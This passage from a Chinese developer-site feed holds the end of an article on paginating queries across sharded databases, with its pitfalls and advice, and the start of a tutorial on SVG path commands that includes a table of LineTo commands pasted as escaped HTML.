<li>精准扫描：各分片仅查询 <code>create_time &gt;= time_min</code> 的数据，按 <code>create_time</code> 排序后取前20条（冗余量避免边界误差），汇总后再排序取目标10条。</li>
</ol>
<h4 data-id="heading-26">适用场景</h4>
<p>非实时场景（如报表系统、历史数据查询），对数据延迟容忍度高（分钟级），但对查询性能要求高的场景。</p>
<h2 data-id="heading-27">四、避坑指南：5个最容易踩的坑及解决方案</h2>
<p>即使选对了方案，落地时也容易踩坑。下面5个坑，是我在实际项目中反复遇到的，附上具体解决方案，帮你少走弯路。</p>
<h3 data-id="heading-28">坑1：偏移量过大导致性能雪崩</h3>
<p>「表现」：offset超过1万后，查询耗时急剧增加，甚至超时；「根源」：全局偏移量无法转化为本地偏移量，每个分片都要扫描大量冗余数据；「解决方案」：禁用深分页跳页，改用游标分页；或用预计算锚点法优化；浅分页场景用方案2。</p>
<h3 data-id="heading-29">坑2：分片键与排序字段不匹配导致分页错乱</h3>
<p>「表现」：分页数据无序、缺失；「根源」：按哈希分片（如用户ID），却按非分片键（如创建时间）排序，各分片数据范围重叠；「解决方案」：分表时尽量选择“排序字段+分片键”的组合（如按创建时间范围分片）；若已按哈希分片，排序时需在应用层做全局排序，确保结果有序。</p>
<h3 data-id="heading-30">坑3：数据动态变更导致重复/缺失</h3>
<p>「表现」：前后页数据重复，或某条数据凭空消失；「根源」：查询过程中，分片插入、删除、更新数据，导致全局排序结果变化；「解决方案」：游标分页时，用“唯一游标”（如create_time+order_id）；关键业务场景，分页查询走主库，避免从库同步延迟；可添加版本号，过滤已删除/更新的数据。</p>
<h3 data-id="heading-31">坑4：多表关联分页复杂度飙升</h3>
<p>「表现」：关联分库分表后的两张表（如订单表+用户表）分页，性能极差；「根源」：关联字段可能不在同一个分片，需跨分片关联，再分页，成本极高；「解决方案」：优先用宽表设计（将用户信息冗余到订单表），避免跨表关联；若必须关联，在业务层做两次查询（先查订单分页，再批量查用户信息），而非数据库层关联。</p>
<h3 data-id="heading-32">坑5：读写分离场景下的数据不一致</h3>
<p>「表现」：分页查询从库，出现数据缺失（主库已写入，从库未同步）；「根源」：主从同步延迟；「解决方案」：关键业务的分页查询走主库；非关键业务，可等待从库同步完成（如延迟100ms）再查询；或用“主从一致性校验”，发现缺失数据时从主库补查。</p>
<h2 data-id="heading-33">五、实践建议：如何快速选型落地？</h2>
<p>结合前面的方案和避坑技巧，给出4条落地建议，帮你快速选型，降低开发成本：</p>
<h3 data-id="heading-34">1. 优先按业务场景选方案（核心原则）</h3>
<ul>
<li>连续浏览场景（Feed流、订单流水）：首选游标分页法；</li>
<li>浅分页+跳页场景（后台管理系统）：首选全局唯一键二次查询法；</li>
<li>多条件筛选+多维度排序（商品搜索）：首选搜索引擎辅助法；</li>
<li>非实时场景（报表、历史数据）：补充预计算锚点法；</li>
<li>分片少、查询低频：可用全局扫描法（快速落地）。</li>
</ul>
<h3 data-id="heading-35">2. 分表设计时，提前考虑分页需求</h3>
<p>分表前，明确分页的排序字段和查询场景，尽量选择“排序字段+分片键”的组合（如按创建时间范围分片），减少后续分页优化的成本；避免用无意义的哈希键分片（如随机ID），否则多维度排序会非常困难。</p>
<h3 data-id="heading-36">3. 避免过度优化，优先满足业务需求</h3>
<p>如果业务分页查询频率低、数据量不大，无需追求“最优方案”，用全局扫描法快速落地即可；只有当分页成为性能瓶颈时，再逐步优化为游标分页或搜索引擎辅助法。</p>
<h3 data-id="heading-37">4. 做好监控与兜底</h3>
<p>监控各分片的查询耗时、内存使用情况，及时发现热点分片；给分页查询设置超时时间（如500ms），超时后降级（如返回前100页数据）；关键业务场景，预留“回退方案”（如切换到单库查询、临时关闭分库分表）。</p>
<h2 data-id="heading-38">六、总结：没有银弹，适配业务才是关键</h2>
<p>分库分表下的分页查询，本质是“解决分布式环境下的全局有序性和性能平衡”问题。我们不需要掌握所有方案，只需记住：</p>
<ul>
<li>浅分页+跳页：用全局唯一键二次查询法；</li>
<li>深分页+连续浏览：用游标分页法；</li>
<li>复杂查询+多维度排序：用搜索引擎辅助法；</li>
<li>所有方案都有取舍，落地时需结合业务场景、数据量、性能要求，平衡开发成本和用户体验。</li>
</ul>
<p>随着分布式数据库（如ShardingSphere、TiDB）的发展，很多分页问题已经可以通过中间件自动处理（如ShardingSphere的分页插件，可自动优化offset分页）。但了解底层原理和手动优化方案，能让我们在遇到复杂场景时，依然能快速定位问题、解决问题。</p>
<p>最后，如果你在实际项目中遇到了特殊的分页场景，欢迎在评论区交流，一起探讨最优解决方案～</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SVG标签中path路径参数学习]]></title>    <link>https://juejin.cn/post/7602893600251838510</link>    <guid>https://juejin.cn/post/7602893600251838510</guid>    <pubDate>2026-02-05T03:14:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602893600251838510" data-draft-id="7602928386595848218" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SVG标签中path路径参数学习"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T03:14:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024小神"/> <meta itemprop="url" content="https://juejin.cn/user/70007368988926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SVG标签中path路径参数学习
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/70007368988926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024小神
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:14:19.000Z" title="Thu Feb 05 2026 03:14:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我的开源项目PakePlus可以将网页/Vue/React项目打包为桌面/手机应用并且小于5M只需几分钟，官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpakeplus.com" target="_blank" title="https://pakeplus.com" ref="nofollow noopener noreferrer">pakeplus.com</a></p><p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/32bda2cb54964def8532da6d38131011~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="2628" loading="lazy"/></p><p/>
<p>官方文档链接：<a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#path" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23path" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#path" target="_blank" ref="nofollow noopener noreferrer">developer.mozilla.org/zh-CN/docs/…</a></p>
<p>路径命令是对要绘制的路径的说明。每一个命令由代表命令的字母和代表参数的数字组成。</p>
<p>SVG 定义了六种路径命令类型，一共 20 条命令：</p>
<p>MoveTo：M、m<br/>
LineTo：L、l、H、h、V、v<br/>
三次贝塞尔曲线：C、c、S、s<br/>
二次贝塞尔曲线：Q、q、T、t<br/>
椭圆曲线：A、a<br/>
ClosePath：Z、z<br/>
备注：命令是大小写敏感的。大写的命令指定绝对坐标，而小写命令指定相对（于当前位置的）坐标。</p>
<p>备注：命令是大小写敏感的。大写的命令指定绝对坐标，而小写命令指定相对（于当前位置的）坐标。</p>
<p>始终可以将负值作为命令的参数：</p>
<p>负的角度是逆时针的；<br/>
绝对坐标中，负的 x 和 y 将被解释为负坐标；<br/>
相对坐标中，负的 x 值为向左移动，负的 y 值为向上移动。</p>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8fbd5534562e41cf8074b6fe02f471a0~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1534" loading="lazy"/></p>
<h3 id="user-content-lineto_路径命令" data-id="heading-0"><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="Lineto 路径命令" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23lineto_%25E8%25B7%25AF%25E5%25BE%2584%25E5%2591%25BD%25E4%25BB%25A4" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#lineto_%E8%B7%AF%E5%BE%84%E5%91%BD%E4%BB%A4" target="_blank" ref="nofollow noopener noreferrer">Lineto 路径命令</a></h3>
<p><em>Lineto</em> 指令将绘制一条直线段。这个直线段从<em>当前位置</em>（<em>Po</em>; {<em>xo</em>, <em>yo</em>}）移到<em>指定位置</em>（<em>Pn</em>; {<em>xn</em>, <em>yn</em>}）。然后，<em>指定位置</em>（<em>Pn</em>）将变成下一个命令中的<em>当前位置</em>（<em>Po′</em>）。</p>
<table>
	<tbody>
		<tr>
			<th scope="col">命令</th>
			<th scope="col">参数</th>
			<th scope="col">备注</th>
		</tr>
		<tr>
			<th scope="row">L</th>
			<td>(<code>x</code>, <code>y</code>)+</td>
			<td>
			<p>在<em>当前位置</em>和<em>指定位置</em> <code>x</code>,<code>y</code> 之间绘制一条线段。后续子坐标序列将被解释为隐式的绝对位置的 LineTo（<code>L</code>）命令的参数。</p>
<pre><code class="hljs language-xml" lang="xml">		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>l<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>之间绘制一条线段，<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处。后续子坐标序列将被解释为隐式的相对位置的 LineTo（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>L<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>H<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>与<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>之间绘制一条水平线段。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>由<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>参数和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>的<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>坐标指定。后续子序列的值将被解释为隐式的绝对位置的 LineTo（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>H<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>h<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>与<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>之间绘制一条水平线段。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>由<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>的<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>坐标和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>的<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>坐标指定。后续子序列的值将被解释为隐式的相对位置的 LineTo（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>h<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>V<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>与<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>之间绘制一条垂直线段。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>指定位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>由<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>参数和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>的<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>坐标指定。后续子序列的值将被解释为隐式的绝对位置的 LineTo（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>V<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

